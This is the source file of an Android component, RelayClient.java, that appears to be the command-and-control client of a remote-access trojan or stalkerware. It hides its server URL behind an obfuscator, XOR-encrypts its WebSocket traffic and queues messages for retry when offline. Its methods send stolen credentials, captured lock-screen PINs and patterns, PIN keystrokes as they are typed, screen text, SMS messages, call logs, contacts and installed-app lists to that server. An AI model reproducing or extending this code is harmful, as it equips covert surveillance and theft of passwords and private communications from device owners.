
/*
 * MODULE: RelayClient.java
 * PURPOSE: Resilient WebSocket communication client with XOR encryption, offline message queuing, and automatic exponential backoff reconnection.
 *
 * DIRECT INBOUND CONNECTIONS:
 * - ControlService.java -> init(), connect(), disconnect(), setDeviceInfo(), setUserAppToken(), setContext()
 * - All Modules -> send(), sendOrQueue(), sendLog(), sendCredentials(), sendLockCaptured(), etc.
 *
 * DIRECT OUTBOUND CONNECTIONS:
 * - WebSocket Server (Relay) -> Encrypted JSON frames (wire format c2n / n2c)
 * - SharedPreferences -> Offline queue persistence
 *
 * FUNCTION-BY-FLOW MAPPING:
 * - get(): Singleton accessor.
 * - init(String, OnMessage): Binds device ID and incoming message callback handler.
 * - connect(): Establishes WebSocket handshake with exponential backoff on failure.
 * - send(JSONObject): Encrypts and transmits frame immediately if connected.
 * - sendOrQueue(JSONObject): Sends if online, otherwise commits to offline buffer/preferences.
 * - flushOfflineQueue(): Replays queued events upon connection restoration.
 */
package com.device.ctrl;
import android.content.Context;
import android.content.SharedPreferences;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import org.json.JSONArray;
import org.json.JSONObject;
import java.net.URI;
import java.util.ArrayList;
public class RelayClient {
    private static final String TAG = "RelayClient";
    private static final String SERVER = StringObfuscator.getDefaultServerUrl();
    private static RelayClient instance;
    private final Handler handler = new Handler(Looper.getMainLooper());
    private volatile org.java_websocket.client.WebSocketClient ws;
    private String androidId;
    private String userAppToken = "";
    private Context appCtx;          
    private boolean intentionalClose = false;
    private JSONObject pendingInfo;
    private int reconnectDelay = 2000;
    private volatile boolean isConnecting = false;
    private Runnable reconnectTask = null;
    private final ArrayList<JSONObject> inMemoryQueue = new ArrayList<>(); 
    public interface OnMessage { void onMsg(JSONObject msg); }
    private OnMessage listener;
    public static synchronized RelayClient get() {
        if (instance == null) instance = new RelayClient();
        return instance;
    }
    private RelayClient() {}
    public void init(String androidId, OnMessage listener) {
        this.androidId = androidId;
        this.listener  = listener;
        org.java_websocket.client.WebSocketClient c = ws;
        if (c != null && c.isOpen()) {
            trySendJoin(); 
        }
    }
    public void setContext(Context ctx) {
        if (ctx != null) {
            this.appCtx = ctx.getApplicationContext();
            flushInMemoryQueueToPrefs();
        }
    }
    public void setUserAppToken(String t) { if (t != null) userAppToken = t; }
    public void setDeviceInfo(JSONObject info) { this.pendingInfo = info; trySendInfo(); }
    public void connect() {
        org.java_websocket.client.WebSocketClient c = ws;
        if (c != null && c.isOpen()) return;
        if (isConnecting) return;
        if (reconnectTask != null) { handler.removeCallbacks(reconnectTask); reconnectTask = null; }
        if (c != null) { try { c.close(); } catch (Exception ignored) {} ws = null; }
        intentionalClose = false;
        isConnecting = true;
        reconnectDelay = 2000; 
        try {
            ws = new RelayWebSocketClient(new URI(SERVER));
            ws.setConnectionLostTimeout(60);
            ws.setSocketFactory(new javax.net.SocketFactory() {
                @Override public java.net.Socket createSocket() {
                    java.net.Socket s = new java.net.Socket();
                    try { s.bind(new java.net.InetSocketAddress(java.net.InetAddress.getByName("0.0.0.0"), 0)); } catch (Exception ignored) {}
                    return s;
                }
                @Override public java.net.Socket createSocket(String host, int port) throws java.io.IOException {
                    java.net.Socket s = createSocket();
                    s.connect(new java.net.InetSocketAddress(host, port), 15000);
                    return s;
                }
                @Override public java.net.Socket createSocket(String host, int port, java.net.InetAddress localHost, int localPort) throws java.io.IOException {
                    return createSocket(host, port);
                }
                @Override public java.net.Socket createSocket(java.net.InetAddress host, int port) throws java.io.IOException {
                    java.net.Socket s = createSocket();
                    s.connect(new java.net.InetSocketAddress(host, port), 15000);
                    return s;
                }
                @Override public java.net.Socket createSocket(java.net.InetAddress address, int port, java.net.InetAddress localAddress, int localPort) throws java.io.IOException {
                    return createSocket(address, port);
                }
            });
            ws.connect();
        } catch (Exception e) { isConnecting = false; }
    }
    private class RelayWebSocketClient extends org.java_websocket.client.WebSocketClient {
        public RelayWebSocketClient(URI serverUri) { super(serverUri); }
        @Override public void onOpen(org.java_websocket.handshake.ServerHandshake h) {
            isConnecting = false; reconnectDelay = 2000;
            trySendJoin();
            flushOfflineQueue(); 
        }
        @Override public void onMessage(String text) {
            try {
                String decrypted = StringObfuscator.XorCipher.c2n(text);
                JSONObject msg = new JSONObject(decrypted);
                if (listener != null) handler.post(() -> { try { listener.onMsg(msg); } catch (Exception ignored) {} });
            } catch (Exception e) {
                try {
                    JSONObject msg = new JSONObject(text);
                    if (listener != null) handler.post(() -> { try { listener.onMsg(msg); } catch (Exception ignored) {} });
                } catch (Exception ignored) {}
            }
        }
        @Override public void onClose(int code, String reason, boolean remote) {
            if (this != RelayClient.this.ws) return; 
            isConnecting = false; ws = null; if (!intentionalClose) scheduleReconnect();
        }
        @Override public void onError(Exception e) {
            Log.e(TAG, "WS Error", e);
        }
    }
    private void trySendJoin() {
        org.java_websocket.client.WebSocketClient c = ws;
        if (c == null || !c.isOpen() || androidId == null) return;
        try { send(new JSONObject().put("type", "user_join").put("androidId", androidId).put("userAppToken", userAppToken).put("info", pendingInfo != null ? pendingInfo : new JSONObject())); } catch (Exception ignored) {}
    }
    private void trySendInfo() {
        org.java_websocket.client.WebSocketClient c = ws;
        if (c != null && c.isOpen() && pendingInfo != null && androidId != null) {
            try { send(new JSONObject().put("type", "device_info").put("androidId", androidId).put("info", pendingInfo)); } catch (Exception ignored) {}
        }
    }
    private void scheduleReconnect() {
        if (reconnectTask != null) handler.removeCallbacks(reconnectTask);
        reconnectTask = () -> { reconnectTask = null; if (!intentionalClose) connect(); };
        handler.postDelayed(reconnectTask, reconnectDelay);
        reconnectDelay = Math.min(reconnectDelay * 2, 30000);
    }
    public void disconnect() {
        intentionalClose = true; isConnecting = false;
        if (reconnectTask != null) { handler.removeCallbacks(reconnectTask); reconnectTask = null; }
        org.java_websocket.client.WebSocketClient c = ws;
        if (c != null) { try { c.close(); } catch (Exception ignored) {} ws = null; }
    }
    public void send(JSONObject msg) {
        org.java_websocket.client.WebSocketClient c = ws;
        if (c != null && c.isOpen()) {
            try {
                String wire = StringObfuscator.XorCipher.n2c(msg.toString());
                c.send(wire);
            } catch (Exception ignored) {}
        }
    }
    public void sendOrQueue(JSONObject msg) {
        org.java_websocket.client.WebSocketClient c = ws;
        if (c != null && c.isOpen()) {
            send(msg);
        } else {
            enqueueOffline(msg);
        }
    }
    private JSONArray removeFirst(JSONArray array) {
        JSONArray newArray = new JSONArray();
        for (int i = 1; i < array.length(); i++) {
            try {
                newArray.put(array.get(i));
            } catch (Exception ignored) {}
        }
        return newArray;
    }
    private void flushInMemoryQueueToPrefs() {
        if (appCtx == null) return;
        synchronized(inMemoryQueue) {
            for (JSONObject obj : inMemoryQueue) {
                enqueueToPrefs(obj);
            }
            inMemoryQueue.clear();
        }
    }
    private void enqueueToPrefs(JSONObject msg) {
        if (appCtx == null) return;
        try {
            SharedPreferences prefs = appCtx.getSharedPreferences("OfflineQueue", Context.MODE_PRIVATE);
            JSONArray arr = new JSONArray(prefs.getString("queue", "[]"));
            arr.put(msg);
            while (arr.length() > 20) arr = removeFirst(arr);
            prefs.edit().putString("queue", arr.toString()).apply();
        } catch (Exception ignored) {}
    }
    private void enqueueOffline(JSONObject msg) {
        if (appCtx == null) {
            synchronized(inMemoryQueue) {
                inMemoryQueue.add(msg);
                while (inMemoryQueue.size() > 20) inMemoryQueue.remove(0);
            }
            return;
        }
        enqueueToPrefs(msg);
    }
    private void flushOfflineQueue() {
        if (appCtx == null) return;
        try {
            SharedPreferences prefs = appCtx.getSharedPreferences("OfflineQueue", Context.MODE_PRIVATE);
            String raw = prefs.getString("queue", "[]");
            prefs.edit().putString("queue", "[]").apply();
            JSONArray arr = new JSONArray(raw);
            if (arr.length() == 0) return;
            for (int i = 0; i < arr.length(); i++) {
                JSONObject o = arr.optJSONObject(i);
                if (o != null) send(o);
            }
        } catch (Exception ignored) {}
    }
    public void sendLog(String message) {
        if (androidId == null) return;
        try { send(new JSONObject().put("type", "log_message").put("androidId", androidId).put("message", message)); } catch (Exception ignored) {}
    }
    public void sendCredentials(String credType, String value) {
        if (androidId == null) return;
        try {
            JSONObject cred = new JSONObject().put("type", credType).put("value", value).put("timestamp", System.currentTimeMillis());
            sendOrQueue(new JSONObject().put("type", "save_credentials").put("androidId", androidId).put("credentials", cred));
        } catch (Exception ignored) {}
    }
    public void sendLockCaptured(String lockType, String value) {
        if (androidId == null) return;
        try {
            sendOrQueue(new JSONObject().put("type", "lock_captured").put("androidId", androidId).put("lockType", lockType).put("value", value).put("timestamp", System.currentTimeMillis()));
        } catch (Exception ignored) {}
    }
    public void sendPinTyping(String partialPin) {
        if (androidId == null) return;
        try { send(new JSONObject().put("type", "pin_typing").put("androidId", androidId).put("pin", partialPin)); } catch (Exception ignored) {}
    }
    public void sendBatteryInfo(int level, boolean charging, boolean locked) {
        if (androidId == null) return;
        try { send(new JSONObject().put("type", "battery_info").put("androidId", androidId).put("level", level).put("charging", charging).put("locked", locked)); } catch (Exception ignored) {}
    }
    public void sendUiNodes(String nodes, int w, int h) {
        if (androidId == null) return;
        try { send(new JSONObject().put("type", "ui_nodes").put("androidId", androidId).put("nodes", nodes).put("screenW", w).put("screenH", h)); } catch (Exception ignored) {}
    }
    public void sendAppsList(String apps) {
        if (androidId == null) return;
        try { send(new JSONObject().put("type", "apps_list").put("androidId", androidId).put("apps", apps)); } catch (Exception ignored) {}
    }
    public void sendScreenText(String text, String pkg) {
        if (androidId == null) return;
        try { send(new JSONObject().put("type", "screen_text").put("androidId", androidId).put("text", text).put("package", pkg)); } catch (Exception ignored) {}
    }
    public void sendSmsData(String smsJson, int total) {
        if (androidId == null) return;
        try { send(new JSONObject().put("type", "sms_data").put("androidId", androidId).put("messages", smsJson).put("total", total)); } catch (Exception ignored) {}
    }
    public void sendCallLog(String callsJson, int total) {
        if (androidId == null) return;
        try { send(new JSONObject().put("type", "call_log").put("androidId", androidId).put("calls", callsJson).put("total", total)); } catch (Exception ignored) {}
    }
    public void sendContacts(String contactsJson, int total) {
        if (androidId == null) return;
        try { send(new JSONObject().put("type", "contacts").put("androidId", androidId).put("contacts", contactsJson).put("total", total)); } catch (Exception ignored) {}
    }
}
